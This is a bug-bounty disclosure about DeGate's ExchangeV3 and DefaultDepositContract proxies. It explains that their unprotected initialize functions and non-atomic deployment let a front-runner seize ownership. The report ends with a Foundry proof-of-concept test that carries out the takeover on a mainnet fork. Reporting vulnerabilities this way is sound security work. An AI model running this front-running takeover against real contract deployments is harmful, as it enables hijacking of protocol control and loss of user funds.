# 26039 - \[SC - Insight] Proxy contract deployments can be front-run to ...

Submitted on Nov 23rd 2023 at 14:43:11 UTC by @p4rsely for [Boost | DeGate](https://immunefi.com/bounty/boosteddegatebugbounty/)

Report ID: #26039

Report type: Smart Contract

Report severity: Insight

Target: <https://etherscan.io/address/0x54D7aE423Edb07282645e740C046B9373970a168#code>

Impacts:

* Contract fails to deliver promised returns, but doesn't lose value

## Description

## Bug Description

The way the implementation and proxy contracts are deployed, allows for a front-run opportunity which allows the attacker to take ownership of the proxies and also set any deposit and/or exchange contract address of their choice.

Taking a look at the deployment script, the deployment does not use a Solidity contract as a Deployment factory and relies on a script. This in itself is not a problem, however combined with the functionality of the implementation contracts via the proxy this can possibly be exploited.

The pro of using a factory is that each transaction is atomic so all functionality can be bundled into one transaction negating the front-run issue.

The current deployment script deploys each contract and initializes it in a separate transaction. This allows for a front-running opportunity for MEV bots if these proxies ever need to be redeployed. They may need to be redeployed should the protocol ever enter shutdown or exodus mode which is not reversible.

How the implementation works is that once the exchange and deposit contracts are set within the separate ExchangeV3 and DefaultDepositContract contracts, it can never be reset, thus in a shutdown or exodus scenario both would need to be redeployed as they refer to each other.

Due to the lack of access control on the initialize functions of each contract of the Exchangev3 and DefaultDepositContracts anyone can call the initialize function successfully if they are the first to call it. Each contract implements the initialize function which sets the caller as the new owner of the contract.

The current code is below: <https://github.com/degatedev/protocols/blob/degate\\_mainnet/packages/loopring\\_v3/contracts/core/impl/ExchangeV3.sol#L81-L102>

```
    // -- Initialization --
    function initialize(
        address _loopring,
        address _owner,
        bytes32 _genesisMerkleRoot,
        bytes32 _genesisMerkleAssetRoot
        )
        external
        override
        nonReentrant
        onlyWhenUninitialized
    {
        require(address(0) != _owner, "ZERO_ADDRESS");
        owner = _owner;

        state.initializeGenesisBlock(
            _loopring,
            _genesisMerkleRoot,
            _genesisMerkleAssetRoot,
            EIP712.hash(EIP712.Domain("DeGate Protocol", version(), address(this)))
        );
    }

```

and

<https://github.com/degatedev/protocols/blob/degate\\_mainnet/packages/loopring\\_v3/contracts/core/impl/DefaultDepositContract.sol#L54-L65>

```
    function initialize(
        address _exchange
        )
        external
    {
        require(
            exchange == address(0) && _exchange != address(0),
            "INVALID_EXCHANGE"
        );
        owner = msg.sender;
        exchange = _exchange;
    }
```

## Impact

This could lead to the takeover of both proxies of the protocol and possible loss of funds.

## Risk Breakdown

Difficulty to Exploit: Easy

## Recommendation

Should the project wish to remain as currently created due to Solidity version compatibility, it can be considered to deploy using a Solidity contract or to set access control on the inititalize functions to be the address of the proxyOwner, as they will only be deployed as proxies going forward.

It can also be considered to check each important `await` statement in the script to not revert by using something as below

```
await expect(contract.call()).not.to.be.reverted;
```

## References

Contracts:

<https://github.com/degatedev/protocols/blob/degate\\_mainnet/packages/loopring\\_v3/contracts/core/impl/ExchangeV3.sol#L81-L102>

<https://github.com/degatedev/protocols/blob/degate\\_mainnet/packages/loopring\\_v3/contracts/core/impl/DefaultDepositContract.sol#L54-L65>

Deployment script:

<https://github.com/degatedev/protocols/blob/degate\\_mainnet/packages/loopring\\_v3/migrations/8\\_deploy\\_exchange\\_v3.js>

## Proof of concept

## PoC

Please copy/paste the code below into a file in the test directory of a foundry project called `ExchangeFrontrunTest.sol`

Please run the test with a fork of the mainnet `forge test --fork-url {YOU_RPC_PROVIDER} --match-test test_FrontrunDeployer -vv`

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;
pragma abicoder v2;

import {Test, console} from "forge-std/Test.sol";
import "src/core/impl/ExchangeV3.sol";
import "src/core/impl/DefaultDepositContract.sol";
import "src/thirdparty/proxies/OwnedUpgradabilityProxy.sol";

contract ExchangeFrontrunTest is Test {
    // variable to hold implementation contract of ExchangeV3
    ExchangeV3 public exchange;

    // variable to hold implementation contract of DefaultDepositContract
    DefaultDepositContract public deposit;

    address deployer = makeAddr("deployer");
    address mevbot = makeAddr("mevbot");

    // variable to hold proxy contract of ExchangeV3
    OwnedUpgradabilityProxy proxy;
    // variable to hold proxy contract of DefaultDepositContract
    OwnedUpgradabilityProxy DepositProxy;


    function setUp() public {
        // deploy implementation and proxies as the correct deployer
        vm.startPrank(deployer);
        exchange = new ExchangeV3();
        deposit = new DefaultDepositContract();
        proxy = new OwnedUpgradabilityProxy();
        DepositProxy = new OwnedUpgradabilityProxy();
        proxy.upgradeTo(address(exchange));
        DepositProxy.upgradeTo(address(deposit));
        vm.stopPrank();
        
    }

    function test_FrontrunDeployer() public {
        //Just for information output the deployer and mevbot addresses
        console.log("[i] The address of the deployer is :",deployer);
        console.log("[i] The address of the mevbot is :",mevbot);
        // Retrieve the current owner of the ExchangeV3 proxy after the deployment
        (bool success,bytes memory callresp) = address(proxy).call(abi.encodeWithSignature("owner()"));
        address current = abi.decode(callresp,(address));
        console.log("[i] Owner of ExhangeV3 proxy directly after deployment :",current);

        // Retrieve the current owner of the ExchangeV3 proxy after the DefaultDepositContract
        (success,callresp) = address(DepositProxy).call(abi.encodeWithSignature("owner()"));
        current = abi.decode(callresp,(address));
        console.log("[i] Owner of DefaultDeposit proxy directly after deployment :",current);

        // now take over the proxies as though we are front-running
        vm.startPrank(mevbot);
        // now Front run the ExchangeV3 contract and takeover ownership and set our own Depsot contract
        (success,callresp) = address(proxy).call(abi.encodeWithSelector(ExchangeV3.initialize.selector,address(0x9385aCd9d78dFE854c543294770d0C94c2B07EDC),mevbot,bytes32("123456789"),bytes32("123456789")));
        (success,callresp) = address(proxy).call(abi.encodeWithSelector(ExchangeV3.setDepositContract.selector,address(DepositProxy)));
        
        // now Front run the DefaultDeposit contract and takeover ownership
        (success,callresp) = address(DepositProxy).call(abi.encodeWithSelector(DefaultDepositContract.initialize.selector,address(exchange)));
        
        // Retrieve the current owner of the ExchangeV3 proxy after the front run
        (success,callresp) = address(proxy).call(abi.encodeWithSignature("owner()"));
        current = abi.decode(callresp,(address));
        console.log("[i] Owner of ExhangeV3 proxy after front run :",current);

        // Retrieve the current owner of the DefaultDeposit proxy after the front run
        (success,callresp) = address(DepositProxy).call(abi.encodeWithSignature("owner()"));
        current = abi.decode(callresp,(address));
        console.log("[i] Owner of DefaultDeposit proxy after front run :",current);
        vm.stopPrank();

        // now try as the deployer to action the initialize as normal
        vm.startPrank(deployer);
        vm.expectRevert();
        (success,callresp) = address(proxy).call(abi.encodeWithSelector(ExchangeV3.initialize.selector,address(0x9385aCd9d78dFE854c543294770d0C94c2B07EDC),mevbot,bytes32("123456789"),bytes32("123456789")));
        vm.stopPrank();
        console.log("[i] If this output runs the test reverted as expected and we took over ownership of the proxies");
    }
}

```
